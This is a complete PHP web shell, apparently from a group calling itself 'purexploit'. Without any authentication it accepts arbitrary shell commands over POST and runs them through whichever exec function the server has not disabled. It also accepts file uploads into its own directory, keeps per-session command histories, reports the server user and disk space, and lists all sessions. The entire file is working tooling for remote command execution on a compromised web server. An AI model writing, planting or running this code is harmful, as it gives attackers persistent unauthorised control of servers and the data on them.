<?php
header("Content-Type: application/json");
ob_start();

$session_file = "sessions.json";
if (!file_exists($session_file)) {
    file_put_contents($session_file, json_encode(array(), JSON_PRETTY_PRINT));
}
$data = json_decode(file_get_contents($session_file), true);


$action = isset($_POST['action']) ? $_POST['action'] : "";
$id     = isset($_POST['id']) ? $_POST['id'] : "";
$cmd    = isset($_POST['cmd']) ? $_POST['cmd'] : "";

if ($action === "upload" && isset($_FILES['file'])) {
    $target_dir = __DIR__ . "/";
    $target_file = $target_dir . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
        echo json_encode(array("status" => "uploaded", "file" => basename($_FILES['file']['name'])));
    } else {
        // Check if move_uploaded_file is disabled
        $disabled = ini_get('disable_functions');
        $disabled_funcs = array_map('trim', explode(',', $disabled));
        if (in_array('move_uploaded_file', $disabled_funcs)) {
            echo json_encode(array("status" => "failed", "error" => "Function move_uploaded_file is disabled"));
        } else {
            echo json_encode(array("status" => "failed"));
        }
    }
    exit;
}

function save_data($file, $data) {
    file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT));
}

function detect_exec_method() {
    $methods = array("system", "shell_exec", "passthru", "exec", "proc_open");
    foreach ($methods as $method) {
        if (function_exists($method) && stripos(ini_get('disable_functions'), $method) === false) {
            return $method;
        }
    }
    return null;
}

function run_command($cmd, $method, $cwd) {
    $output = "";
    $full_cmd = "cd " . escapeshellarg($cwd) . " && " . $cmd;
    switch ($method) {
        case "system":
            ob_start();
            @system($full_cmd);
            $output = ob_get_clean();
            break;
        case "shell_exec":
            $output = @shell_exec($full_cmd);
            break;
        case "passthru":
            ob_start();
            @passthru($full_cmd);
            $output = ob_get_clean();
            break;
        case "exec":
            $result = array();
            @exec($full_cmd, $result);
            $output = implode("\n", $result);
            break;
        case "proc_open":
            $descriptorspec = array(
                0 => array("pipe", "r"),
                1 => array("pipe", "w"),
                2 => array("pipe", "w")
            );
            $process = @proc_open($full_cmd, $descriptorspec, $pipes, $cwd);
            if (is_resource($process)) {
                $output = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                proc_close($process);
            }
            break;
        default:
            $output = "[!] No working exec function";
    }
    return trim($output);
}

if ($action === "register") {
    if (!$id) $id = uniqid();
    if (!isset($data[$id])) {
        $method = detect_exec_method();
        $cwd = getcwd();
        $data[$id] = array(
            "last_seen" => time(),
            "history" => array(),
            "method" => $method,
            "cwd" => $cwd,
            "home" => $cwd
        );
    }
    save_data($session_file, $data);
    echo json_encode(array(
        "id" => $id,
        "status" => "connected",
        "method" => $data[$id]["method"],
        "cwd" => $data[$id]["cwd"],
        "user" => function_exists('get_current_user') ? get_current_user() : (getenv('USER') ?: (getenv('USERNAME') ?: 'unknown')),
        "storage" => function_exists('disk_total_space') ? disk_total_space($data[$id]["cwd"]) : 0
    ));
    exit;
}

if ($action === "push" && isset($data[$id])) {
    $data[$id]["last_seen"] = time();
    $method = isset($data[$id]["method"]) ? $data[$id]["method"] : detect_exec_method();
    $cwd = isset($data[$id]["cwd"]) ? $data[$id]["cwd"] : getcwd();
    $home = isset($data[$id]["home"]) ? $data[$id]["home"] : getcwd();

    // Handle cd commands
    if (preg_match('/^cd\s*(.*)$/', trim($cmd), $matches)) {
        $target = trim($matches[1]);
        if ($target === "") {
            // cd alone → go home
            $cwd = $home;
        } elseif ($target === "..") {
            $cwd = dirname($cwd);
        } else {
            $new_path = $cwd . DIRECTORY_SEPARATOR . $target;
            if (is_dir($new_path)) {
                $cwd = realpath($new_path);
            } elseif (is_dir($target)) {
                $cwd = realpath($target);
            }
        }
        $data[$id]["cwd"] = $cwd;
        $result = "Changed directory to: " . $cwd;
    } else {
        // Run normal command
        $result = run_command($cmd, $method, $cwd);
    }

    $data[$id]["history"][] = array(
        "cmd" => $cmd,
        "output" => base64_encode($result),
        "time" => date("Y-m-d H:i:s")
    );
    save_data($session_file, $data);

    echo json_encode(array(
        "status" => "executed",
        "cwd" => $cwd,
        "output" => base64_encode($result)
    ));
    exit;
}

if ($action === "fetch_result" && isset($data[$id])) {
    $last = end($data[$id]["history"]);
    echo json_encode($last ? $last : array());
    exit;
}

if ($action === "history" && isset($data[$id])) {
    echo json_encode($data[$id]["history"], JSON_PRETTY_PRINT);
    exit;
}

if ($action === "list") {
    echo json_encode($data, JSON_PRETTY_PRINT);
    exit;
}

echo json_encode(array("team" => "purexploit"));
